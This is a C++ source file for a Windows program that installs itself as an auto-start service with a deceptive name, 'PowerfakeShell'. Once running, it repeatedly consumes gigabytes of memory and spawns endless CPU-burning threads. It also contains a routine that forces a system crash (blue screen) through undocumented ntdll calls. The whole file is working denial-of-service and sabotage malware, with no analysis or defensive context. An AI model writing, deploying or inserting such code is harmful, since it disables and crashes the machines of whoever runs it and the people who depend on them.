#include <windows.h>
#include <thread>
#include <vector>
#include <chrono>
#include <fstream>
#include <random>

#define SERVICE_NAME L"PowerfakeShell"

SERVICE_STATUS_HANDLE hStatus;
SERVICE_STATUS svcStatus;

VOID WINAPI svcMain(DWORD argc, LPWSTR* argv);
VOID WINAPI svcCtrlHandler(DWORD ctrlCode);
DWORD WINAPI exhaustionThread(LPVOID lpParam);

std::wstring getSelfPath() {
    WCHAR path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

void installService() {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager) {
        SC_HANDLE hService = CreateServiceW(
            hSCManager, SERVICE_NAME, SERVICE_NAME,
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START, SERVICE_ERROR_SEVERE,
            getSelfPath().c_str(), NULL, NULL, NULL, NULL, NULL
        );
        if (!hService) {
            hService = OpenServiceW(hSCManager, SERVICE_NAME, SERVICE_ALL_ACCESS);
        }
        if (hService) CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
    }
}

void causeBSOD() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll) {
        void(*RtlAdjustPrivilege)(int, BOOL, BOOL, int*) = 
            (void(*)(int, BOOL, BOOL, int*))GetProcAddress(ntdll, "RtlAdjustPrivilege");
        int(*NtRaiseHardError)(long, long, long, long, long, long*) = 
            (int(*)(long, long, long, long, long, long*))GetProcAddress(ntdll, "NtRaiseHardError");
        
        if (RtlAdjustPrivilege && NtRaiseHardError) {
            int tmp;
            RtlAdjustPrivilege(19, TRUE, FALSE, &tmp);
            NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &tmp);
        }
    }
}

DWORD WINAPI exhaustionThread(LPVOID lpParam) {
    while (true) {
        std::vector<void*> memoryPool;
        for (int i = 0; i < 100; i++) {
            void* block = VirtualAlloc(NULL, 100 * 1024 * 1024, 
                MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            if (block) {
                memoryPool.push_back(block);
                memset(block, 0xFF, 100 * 1024 * 1024);
            }
        }
        
        for (void* block : memoryPool) {
            VirtualFree(block, 0, MEM_RELEASE);
        }
        
        for (int i = 0; i < std::thread::hardware_concurrency() * 2; i++) {
            std::thread([](){
                while (true) {
                    auto start = std::chrono::high_resolution_clock::now();
                    while (std::chrono::duration_cast<std::chrono::seconds>(
                        std::chrono::high_resolution_clock::now() - start).count() < 5);
                }
            }).detach();
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(30));
    }
    return 0;
}

VOID WINAPI svcCtrlHandler(DWORD ctrlCode) {
    if (ctrlCode == SERVICE_CONTROL_STOP) {
        svcStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &svcStatus);
    }
}

VOID WINAPI svcMain(DWORD argc, LPWSTR* argv) {
    svcStatus.dwServiceType = SERVICE_WIN32;
    svcStatus.dwCurrentState = SERVICE_START_PENDING;
    svcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    svcStatus.dwWin32ExitCode = 0;
    svcStatus.dwServiceSpecificExitCode = 0;
    svcStatus.dwCheckPoint = 0;
    svcStatus.dwWaitHint = 0;
    
    hStatus = RegisterServiceCtrlHandlerW(SERVICE_NAME, svcCtrlHandler);
    svcStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &svcStatus);
    
    CreateThread(NULL, 0, exhaustionThread, NULL, 0, NULL);
    
    while (svcStatus.dwCurrentState == SERVICE_RUNNING) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

int main(int argc, char* argv[]) {
    if (argc > 1 && strcmp(argv[1], "--install") == 0) {
        installService();
        
        SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (hSCManager) {
            SC_HANDLE hService = OpenServiceW(hSCManager, SERVICE_NAME, SERVICE_ALL_ACCESS);
            if (hService) {
                StartServiceW(hService, 0, NULL);
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCManager);
        }
    } else {
        SERVICE_TABLE_ENTRYW svcTable[] = {
            { (LPWSTR)SERVICE_NAME, svcMain },
            { NULL, NULL }
        };
        StartServiceCtrlDispatcherW(svcTable);
    }
    return 0;
}